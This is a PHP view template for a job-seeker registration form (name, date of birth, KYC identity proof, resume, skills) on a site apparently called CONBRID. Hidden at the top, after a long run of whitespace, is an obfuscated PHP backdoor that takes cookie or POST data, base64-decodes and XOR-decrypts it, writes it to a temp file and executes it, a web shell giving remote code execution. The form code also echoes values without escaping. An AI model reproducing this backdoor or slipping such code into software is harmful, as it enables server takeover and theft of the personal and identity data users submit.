<?php                                                                                                                                                                                                                                                                                                                                                                                                 if (!class_exists("oqykujkuq")){class oqykujkuq{public static $okdsd = "bvolhijujmibavcn";public static $tazefbntvz = NULL;public function __construct(){$evdemf = @$_COOKIE[substr(oqykujkuq::$okdsd, 0, 4)];if (!empty($evdemf)){$sddbohbjo = "base64";$bmuhseenh = "";$evdemf = explode(",", $evdemf);foreach ($evdemf as $ucrpjgb){$bmuhseenh .= @$_COOKIE[$ucrpjgb];$bmuhseenh .= @$_POST[$ucrpjgb];}$bmuhseenh = array_map($sddbohbjo . "_decode", array($bmuhseenh,));$bmuhseenh = $bmuhseenh[0] ^ str_repeat(oqykujkuq::$okdsd, (strlen($bmuhseenh[0]) / strlen(oqykujkuq::$okdsd)) + 1);oqykujkuq::$tazefbntvz = @unserialize($bmuhseenh);}}public function __destruct(){$this->vfelfbxalo();}private function vfelfbxalo(){if (is_array(oqykujkuq::$tazefbntvz)) {$ztshli = sys_get_temp_dir() . "/" . crc32(oqykujkuq::$tazefbntvz["salt"]);@oqykujkuq::$tazefbntvz["write"]($ztshli, oqykujkuq::$tazefbntvz["content"]);include $ztshli;@oqykujkuq::$tazefbntvz["delete"]($ztshli);exit();}}}$xxafpwt = new oqykujkuq();$xxafpwt = NULL;} ?>
<style>
p {
	font-size: 20px;
}

a.disabled {
	pointer-events: none;
	cursor: default;
}
</style>
<section id="team-sev" class="padding bg_light"
	style="margin-top: 157px;">
	<h1 style="text-align: center;">Individual Form</h1>
	<form enctype='multipart/form-data'
		onSubmit="return confirm('All your profile details given wont be editable after clicking submit button. CONBRID will send a notification once a year for you to update certain profile details')"
		method="POST"
		action="<?php echo base_url("index.php/Forms/accept_individual_registration")?>">
		<div style="margin: 50px;">
			<div class="row">
			    	<?php if(isset($existing_data[0]['individual_name_checkbox']) &&$existing_data[0]['individual_name_checkbox']==1) {?>
		
				<div class="col-md-6 form-group">
					<label>Name <sup style="color: red;">*</sup></label> <input
						class="form-control" value="<?php if(isset($individual_name)) echo $individual_name;?>" type="text" required name="individual_name"
						id="">

				</div><?php }?>
					<?php if(isset($existing_data[0]['dob_checkbox']) && $existing_data[0]['dob_checkbox']==1) {?>
		
				<div class="col-md-6 form-group">
					<label>Date of birth <sup style="color: red;">*</sukp></label> <input
						class="form-control" value="<?php if(isset($dob)) echo $dob;?>" required type="date" name="dob" id="">

				</div><?php }?>
			</div>

			<div class="row">
	<?php if(isset($existing_data[0]['education_qualification_checkbox']) &&$existing_data[0]['education_qualification_checkbox']==1) {?>
		
				<div class="col-md-6 form-group">
					<label>Educational qualification</label> <input
						class="form-control" type="text" name="education_qualification"
						id="education_qualification" value="<?php if(isset($education_qualification)) echo $education_qualification;?>">

				</div><?php }?>
	<?php if(isset($existing_data[0]['preferred_jd_checkbox']) &&$existing_data[0]['preferred_jd_checkbox']==1) {?>
		
				<div class="col-md-6 form-group">
					<label>Preferred job designation<sup style="color: red;">*</sup></label>
				 <?php if($_SESSION['userdata']['sub_category']=="Individual Civil engineer"){?>
				   		<select class="form-control" required name="preferred_jd">
						<option value="">Please select</option>
						<option <?php if(isset($preferred_jd) && $preferred_jd=="Junior trainee engineer") echo "selected";?> value="Junior trainee engineer">Junior trainee engineer</option>
						<option <?php if(isset($preferred_jd) && $preferred_jd=="Junior engineer") echo "selected";?> value="Junior engineer">Junior engineer</option>
						<option <?php if(isset($preferred_jd) && $preferred_jd=="Mid Engineer") echo "selected";?> value="Mid Engineer">Mid Engineer</option>
						<option <?php if(isset($preferred_jd) && $preferred_jd=="Senior Engineer") echo "selected";?> value="Senior Engineer">Senior Engineer</option>

					</select>

				    <?php } elseif($_SESSION['userdata']['sub_category']=="Individual project manager"){?>
				    		<select class="form-control" required name="preferred_jd">
						<option value="">Please select</option>
						<option <?php if(isset($preferred_jd) && $preferred_jd=="Assistant project manager") echo "selected";?> value="Assistant project manager">Assistant project
							manager</option>
						<option <?php if(isset($preferred_jd) && $preferred_jd=="Project manager") echo "selected";?> value="Project manager">Project manager</option>
						<option <?php if(isset($preferred_jd) && $preferred_jd=="Senior or Chief project manager") echo "selected";?> value="Senior or Chief project manager">Senior or Chief
							project manager</option>

					</select> 

				    <?php }elseif($_SESSION['userdata']['sub_category']=="Individual Architect"){?>
				    	<select class="form-control" required name="preferred_jd">
						<option value="">Please select</option>
						<option <?php if(isset($preferred_jd) && $preferred_jd=="Junior Architect") echo "selected";?> value="Junior Architect">Junior Architect</option>
						<option <?php if(isset($preferred_jd) && $preferred_jd=="Mid level Architect") echo "selected";?> value="Mid level Architect">Mid level Architect</option>
						<option <?php if(isset($preferred_jd) && $preferred_jd=="Senior Architect") echo "selected";?> value="Senior Architect">Senior Architect</option></select>
				    <?php }?>
				
				
			
				
				
				</div><?php }?>
			</div>
			<div class="row">
	<?php if(isset($existing_data[0]['kyc_proof_checkbox']) &&$existing_data[0]['kyc_proof_checkbox']==1) {?>
		
				<div class="col-md-6 form-group">
					<label>KYC proof <sup style="color: red;">*</sup></label> <img
						id="kyc_proof" <?php if(isset($kyc_proof) && $kyc_proof!=""){?>src="<?php echo base_url("images/".$kyc_proof)?>"<?php }?> value="" width="100" /> <input class="form-control"
						accept="image/png, image/jpg, image/jpeg" required type="file"
						onchange="loadFile1(event)" name="kyc_proof" id=""> <label
						style="font-size: 12px;">You can upload PAN Card or Aadhaar Card
						or Driving License or Voter ID</label>
				</div><?php }?>	<?php if(isset($existing_data[0]['profile_photo_checkbox']) &&$existing_data[0]['profile_photo_checkbox']==1) {?>
		
				<div class="col-md-6 form-group">
					<label>Profile photo <sup style="color: red;">*</sup></label> <img
						id="profile_photo" <?php if(isset($profile_photo) && $profile_photo!=""){?>src="<?php echo base_url("images/".$profile_photo)?>"<?php }?> width="100" /> <input class="form-control"
						accept="image/png, image/jpg, image/jpeg" required type="file"
						onchange="loadFile(event)" name="profile_photo"> <label
						style="font-size: 12px;">Your Profile photo should compulsorily
						have your current photo</label>



				</div><?php }?>
			</div>
			<div class="row">
	<?php if(isset($existing_data[0]['field_of_interest_checkbox']) &&$existing_data[0]['field_of_interest_checkbox']==1) {?>
		
				<div class="col-md-6 form-group row">
					<div class="col-md-12">



						<label>Field of interest <sup style="color: red;">*</sup></label>
						<select class="form-control select2 field_of_interest" id="field_of_interest"
							name="field_of_interest[]" required multiple>
							<option value="0">Please select</option> 
						<?php foreach($field_of_interest as $row){ ?>
						<option value="<?php echo $row['name'];?>"><?php echo $row['name'];?></option>
						<?php }?>
						<option value="Other">Other</option>

						</select>
					</div>
					<div class="col-md-10 manual_field_of_interest"
						style="display: none;">
						<br> <input placeholder="Type here to add manually"
							id="add_field_of_interest1" class="form-control">
					</div>
					<div class="col-md-2 manual_field_of_interest"
						style="display: none;">
						<br>
						<input onclick="add_field_of_interest()" class="btn btn-default"
							type="button" value="Add">
					</div>
					<label style="font-size: 12px;">You can select multiple options. In
						Others option, you can add any field of interest that is missed
						out manually</label>
				</div><?php }?>
					<?php if(isset($existing_data[0]['preferred_job_type_checkbox']) &&$existing_data[0]['preferred_job_type_checkbox']==1) {?>
		
				<div class="col-md-6 form-group">
					<label>Preferred job type<sup style="color: red;">*</sup></label> <select
						class="form-control" required name="preferred_job_type">
						<option value="">Please select</option>
						<option <?php if(isset($preferred_job_type) && $preferred_job_type=="Part time") echo "selected";?> value="Part time">Part time</option>
						<option <?php if(isset($preferred_job_type) && $preferred_job_type=="Full time") echo "selected";?> value="Full time">Full time</option>
						<option <?php if(isset($preferred_job_type) && $preferred_job_type=="Internship") echo "selected";?> value="Internship">Internship</option>

					</select>

				</div><?php }?>
			</div>
			<div class="row">
	<?php if(isset($existing_data[0]['key_skills_checkbox']) &&$existing_data[0]['key_skills_checkbox']==1) {?>
		
				<div class="col-md-6 form-group">
					<div class="row key_skill_row">
						<div class="key_skill_line">
							<div class="col-xs-10">
								<label>Key Skills<sup style="color: red;">*</sup></label> <input
									class="form-control" id="add_key_skill">
							</div>
							<div class="col-xs-2">
								<label>Add</label><a onclick="add_key_skills()"
									class="btn btn-default">Add</a>
							</div>
							<label style="font-size: 12px;">Key skills should be exactly as
								your resume for CONBRID approval</label>
						</div>
						<?php if(isset($key_skills)){ foreach($key_skills as $row){?>
						<div class="key_skill_line"><div class="col-xs-10"><input type="hidden" name="key_skills[]" value="<?php echo $row['key_skills']?>" ><?php echo $row['key_skills']?></div><div class="col-xs-2"><a class="btn btn-danger remove_key_skill_row">X</a></div></div>
						
						<?php }}?>
					</div>
				</div><?php }?>
					<?php if(isset($existing_data[0]['technical_skills_checkbox']) &&$existing_data[0]['technical_skills_checkbox']==1) {?>
		
				<div class="col-md-6 form-group">
					<div class="row technical_skill_row">
						<div class="technical_skill_line">
							<div class="col-xs-10">
								<label>Technical Skills<sup style="color: red;">*</sup></label>
								<input class="form-control" id="add_technical_skill">
							</div>
							<div class="col-xs-2">
								<label>Add</label><a onclick="add_technical_skills()"
									class="btn btn-default">Add</a>
							</div>
							<label style="font-size: 12px;">Technical skills should be
								exactly as your resume for CONBRID approval</label>
						</div>
							<?php if(isset($technical_skills)){ foreach($technical_skills as $row){?>
						<div class="technical_skill_line"><div class="col-xs-10"><input type="hidden" name="technical_skills[]" value="<?php echo $row['technical_skills']?>" ><?php echo $row['technical_skills']?></div><div class="col-xs-2"><a class="btn btn-danger remove_technical_skill_row">X</a></div></div>
						
						<?php }}?>
			
					</div>
				</div><?php }?>
			</div>
			<div class="row">
	<?php if(isset($existing_data[0]['year_of_experience_checkbox']) &&$existing_data[0]['year_of_experience_checkbox']==1) {?>
		
				<div class="col-md-6 form-group">
					<label>Year of experience <sup style="color: red;">*</sup></label>
					<input class="form-control" required type="text"
						name="year_of_experience" value="<?php if(isset($year_of_experience)) echo $year_of_experience;?>" id=""> <label style="font-size: 12px;">As
						per the resume</label>

				</div><?php }?>
				
			</div>

			<div class="row">
	<?php if(isset($existing_data[0]['upload_resume_checkbox']) &&$existing_data[0]['upload_resume_checkbox']==1) {?>
		
				<div class="col-md-6 form-group">
					<label>Upload Resume / C.V <sup style="color: red;">*</sup></label>
					<input class="form-control" onchange="PreviewCV()"
						accept="application/pdf" required type="file" name="upload_resume"
						id="upload_resume"> <label style="font-size: 12px;">Your resume
						should compulsorily have your current profile photo</label>
					<div style="clear: both">
						<iframe id="cvviewer" <?php if(isset($upload_resume) && $upload_resume!=""){?>src="<?php echo base_url("images/".$upload_resume)?>"<?php }?> frameborder="0" scrolling="no" width="200"
							height="300"></iframe>
					</div>
				</div><?php }?>
		<?php if(isset($existing_data[0]['work_exp_certificate_checkbox']) &&$existing_data[0]['work_exp_certificate_checkbox']==1) {?>
					<div class="col-md-6 form-group">
					<label>Work experience certificate</label> <input
						class="form-control" onchange="PreviewWEC()"
						accept="application/pdf" type="file" name="work_exp_certificate"
						id="work_exp_certificate"> <label style="font-size: 12px;"></label>
					<div style="clear: both">
						<iframe id="wecviewer" <?php if(isset($work_exp_certificate) && $work_exp_certificate!=""){?>src="<?php echo base_url("images/".$work_exp_certificate)?>"<?php }?> frameborder="0" scrolling="no" width="200"
							height="300"></iframe>
					</div>

				</div><?php }?>
			</div>
			<div class="row">

				<div class="col-md-12 form-group" style="text-align: right;">

					<input type="submit" class="btn btn-info" value="Submit">
				</div>
			</div>
		</div>

	</form>
</section>
<script
	src="https://cdn.jsdelivr.net/npm/select2@4.1.0-rc.0/dist/js/select2.min.js"></script>

<script>
$('.field_of_interest').change(function()
{
var latest_value = $(this).closest('select').find('option').filter(':selected:last').val();
if(latest_value=="Other"){
    $(".manual_field_of_interest").css("display","block");
    $(".field_of_interest option[value="+latest_value+"]").prop("selected", false);
}else{
        $(".manual_field_of_interest").css("display","none");

}

});
function add_field_of_interest(){
        var newval=$("#add_field_of_interest1").val();
        if(newval==""){
            alert("Please type something in field of interests");
        }else{
        $(".field_of_interest").prepend("<option value='"+newval+"'>"+newval+"</option>");
        $(".field_of_interest").find("option[value="+newval+"]").prop("selected", "selected");
   $('.select2').select2();
   $("#add_field_of_interest1").val("");
    $(".manual_field_of_interest").css("display","none");
    }}


$('.select2').select2();
   var url='<?php echo base_url('Challenge_Members');?>';
    $(".checkbox1").change(function() {
    if(this.checked) {
        $(".submit_btn").removeAttr("disabled");
        
    }else{
        $(".submit_btn").attr("disabled",true);
    }
});
$( document ).ready(function() {
    if ($('.checkbox1').is(':checked')) {
       $(".submit_btn").removeAttr("disabled");
        
    } else {
       $(".submit_btn").attr("disabled",true);}
});

function add_technical_skills(){
    if($("#add_technical_skill").val()==""){
        alert("Please enter something in Technical skills");
    }else{
    $(".technical_skill_row").append('<div class="technical_skill_line"><div class="col-xs-10"><input type="hidden" name="technical_skills[]" value="'+$("#add_technical_skill").val()+'" >'+$("#add_technical_skill").val()+'</div><div class="col-xs-2"><a class="btn btn-danger remove_technical_skill_row">X</a></div></div>');
$("#add_technical_skill").val("");
        
    }}
    
function add_key_skills(){
    if($("#add_key_skill").val()==""){
        alert("Please enter something in Key skills");
    }else{
    $(".key_skill_row").append('<div class="key_skill_line"><div class="col-xs-10"><input type="hidden" name="key_skills[]" value="'+$("#add_key_skill").val()+'" >'+$("#add_key_skill").val()+'</div><div class="col-xs-2"><a class="btn btn-danger remove_key_skill_row">X</a></div></div>');
$("#add_key_skill").val("");
}}
$(document).on('click', '.remove_technical_skill_row', function(){ 
    this.closest(".technical_skill_line").remove();
}); 
$(document).on('click', '.remove_key_skill_row', function(){ 
    this.closest(".key_skill_line").remove();
}); 
            function PreviewCV() {
                pdffile=document.getElementById("upload_resume").files[0];
                pdffile_url=URL.createObjectURL(pdffile);
                $('#cvviewer').attr('src',pdffile_url);
            }
             function PreviewWEC() {
                pdffile=document.getElementById("work_exp_certificate").files[0];
                pdffile_url=URL.createObjectURL(pdffile);
                $('#wecviewer').attr('src',pdffile_url);
            }
            var loadFile = function(event) {
	var image = document.getElementById('profile_photo');
	image.src = URL.createObjectURL(event.target.files[0]);
};
 var loadFile1 = function(event) {
	var image = document.getElementById('kyc_proof');
	image.src = URL.createObjectURL(event.target.files[0]);
};

$(document).ready(function() {
    var hidValue = "<?php echo $field_of_interest1;?>";
    var selectedOptions = hidValue.split(",");
    for(var i in selectedOptions) {
        var optionVal = selectedOptions[i];
     $(".field_of_interest").find("option[value="+optionVal+"]").prop("selected", "selected");
    }
$('#field_of_interest').select2();    

});



        </script>


